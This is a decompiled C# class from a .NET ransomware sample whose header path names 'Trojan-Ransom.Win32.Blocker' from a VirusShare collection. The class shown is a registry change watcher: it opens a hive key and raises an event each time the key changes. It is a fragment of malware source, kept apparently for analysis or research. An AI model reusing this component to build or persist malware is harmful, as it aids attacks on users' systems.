// Decompiled with JetBrains decompiler
// Type: insomnia.Class34
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace insomnia
{
  internal class Class34 : IDisposable
  {
    private const int Field19 = 1;
    private const int Field18 = 16;
    private const int Field17 = 131072;
    private static readonly IntPtr Field16 = new IntPtr(int.MinValue);
    private static readonly IntPtr Field15 = new IntPtr(-2147483647);
    private static readonly IntPtr Field14 = new IntPtr(-2147483646);
    private static readonly IntPtr Field13 = new IntPtr(-2147483645);
    private static readonly IntPtr Field12 = new IntPtr(-2147483644);
    private static readonly IntPtr Field11 = new IntPtr(-2147483643);
    private static readonly IntPtr Field10 = new IntPtr(-2147483642);
    private IntPtr Field7;
    private string Field6;
    private object Field5 = new object();
    private Thread Field4;
    private bool Field3;
    private ManualResetEvent Field2 = new ManualResetEvent(false);
    private Enum1 Field1 = Enum1.Field4 | Enum1.Field3 | Enum1.Field2 | Enum1.Field1;

    public Class34(RegistryKey registryKey) => this.Method5(registryKey.Name);

    public Class34(string name)
    {
      switch (name)
      {
        case "":
        case null:
          throw new ArgumentNullException(nameof (name));
        default:
          this.Method5(name);
          break;
      }
    }

    public Class34(RegistryHive registryHive, string subKey) => this.Method6(registryHive, subKey);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern int RegOpenKeyEx(
      IntPtr A_0,
      string A_1,
      uint A_2,
      int A_3,
      out IntPtr A_4);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern int RegNotifyChangeKeyValue(
      IntPtr A_0,
      bool A_1,
      Enum1 A_2,
      IntPtr A_3,
      bool A_4);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern int RegCloseKey(IntPtr A_0);

    public event EventHandler Event_0;

    protected virtual void Method8()
    {
      EventHandler field9 = this.Field9;
      if (field9 == null)
        return;
      field9((object) this, (EventArgs) null);
    }

    public event ErrorEventHandler Event_1;

    protected virtual void Method7(Exception A_1)
    {
      ErrorEventHandler field8 = this.Field8;
      if (field8 == null)
        return;
      field8((object) this, new ErrorEventArgs(A_1));
    }

    public void Dispose()
    {
      this.Method3();
      this.Field3 = true;
      GC.SuppressFinalize((object) this);
    }

    public Enum1 Property2
    {
      get => this.Field1;
      set
      {
        lock (this.Field5)
        {
          if (this.Property1)
            throw new InvalidOperationException("Monitoring thread is already running");
          this.Field1 = value;
        }
      }
    }

    private void Method6(RegistryHive A_1, string A_2)
    {
      switch (A_1)
      {
        case RegistryHive.ClassesRoot:
          this.Field7 = Class34.Field16;
          break;
        case RegistryHive.CurrentUser:
          this.Field7 = Class34.Field15;
          break;
        case RegistryHive.LocalMachine:
          this.Field7 = Class34.Field14;
          break;
        case RegistryHive.Users:
          this.Field7 = Class34.Field13;
          break;
        case RegistryHive.PerformanceData:
          this.Field7 = Class34.Field12;
          break;
        case RegistryHive.CurrentConfig:
          this.Field7 = Class34.Field11;
          break;
        case RegistryHive.DynData:
          this.Field7 = Class34.Field10;
          break;
        default:
          throw new InvalidEnumArgumentException("hive", (int) A_1, typeof (RegistryHive));
      }
      this.Field6 = A_2;
    }

    private void Method5(string A_1)
    {
      string[] strArray = A_1.Split('\\');
      switch (strArray[0])
      {
        case "HKEY_CLASSES_ROOT":
        case "HKCR":
          this.Field7 = Class34.Field16;
          break;
        case "HKEY_CURRENT_USER":
        case "HKCU":
          this.Field7 = Class34.Field15;
          break;
        case "HKEY_LOCAL_MACHINE":
        case "HKLM":
          this.Field7 = Class34.Field14;
          break;
        case "HKEY_USERS":
          this.Field7 = Class34.Field13;
          break;
        case "HKEY_CURRENT_CONFIG":
          this.Field7 = Class34.Field11;
          break;
        default:
          this.Field7 = IntPtr.Zero;
          throw new ArgumentException("The registry hive '" + strArray[0] + "' is not supported", "value");
      }
      this.Field6 = string.Join("\\", strArray, 1, strArray.Length - 1);
    }

    public bool Property1 => this.Field4 != null;

    public void Method4()
    {
      if (this.Field3)
        throw new ObjectDisposedException((string) null, "This instance is already disposed");
      lock (this.Field5)
      {
        if (this.Property1)
          return;
        this.Field2.Reset();
        this.Field4 = new Thread(new ThreadStart(this.Method2));
        this.Field4.IsBackground = true;
        this.Field4.Start();
      }
    }

    public void Method3()
    {
      if (this.Field3)
        throw new ObjectDisposedException((string) null, "This instance is already disposed");
      lock (this.Field5)
      {
        Thread field4 = this.Field4;
        if (field4 == null)
          return;
        this.Field2.Set();
        field4.Join();
      }
    }

    private void Method2()
    {
      try
      {
        this.Method1();
      }
      catch (Exception ex)
      {
        this.Method7(ex);
      }
      this.Field4 = (Thread) null;
    }

    private void Method1()
    {
      IntPtr A_4;
      int error1 = Class34.RegOpenKeyEx(this.Field7, this.Field6, 0U, 131089, out A_4);
      if (error1 != 0)
        throw new Win32Exception(error1);
      try
      {
        AutoResetEvent autoResetEvent = new AutoResetEvent(false);
        WaitHandle[] waitHandles = new WaitHandle[2]
        {
          (WaitHandle) autoResetEvent,
          (WaitHandle) this.Field2
        };
        while (!this.Field2.WaitOne(0, true))
        {
          int error2 = Class34.RegNotifyChangeKeyValue(A_4, true, this.Field1, autoResetEvent.Handle, true);
          if (error2 != 0)
            throw new Win32Exception(error2);
          if (WaitHandle.WaitAny(waitHandles) == 0)
            this.Method8();
        }
      }
      finally
      {
        if (A_4 != IntPtr.Zero)
          Class34.RegCloseKey(A_4);
      }
    }
  }
}
